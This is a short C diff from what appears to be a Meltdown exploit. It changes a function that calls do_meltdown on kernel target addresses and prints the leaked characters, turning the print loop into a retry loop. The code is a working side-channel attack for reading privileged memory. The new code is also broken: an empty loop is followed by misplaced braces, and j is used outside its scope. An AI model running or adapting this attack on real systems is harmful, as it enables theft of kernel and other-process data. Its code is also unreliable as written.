@@ -171,12 +171,16 @@ static void attack_init_uts_ns(){
     
     wait(1E9);
     cc_init();
-    for (int i=0;i<100;i++){
-        printf("getting char %c at location %p\n", do_meltdown(target_adrs+2*i), target_adrs+2*i);
-    }
-    struct old_utsname *uts_ptr = target_adrs;
-    for (int i=0;i<1000;i++){
-        printf("getting char %c at location %p\n", do_meltdown(target_adrs+i), target_adrs+i);
+    int leaked_val[100];
+    for (int i=0;i<100;i++) leaked_val[i] = -1;
+    
+    for(int j=0;j<10000;j++){}
+        for (int i=0;i<100;i++){
+            if (leaked_val[i] == -1){
+                leaked_val[i]=do_meltdown(target_adrs+2*i);
+                if (leaked_val[i] == -1) printf("getting value %i at location %ld and i %i, cur reps %i\n", leaked_val[i], target_adrs+2*i, i, j);
+            }  
+        }
     }
 }
 
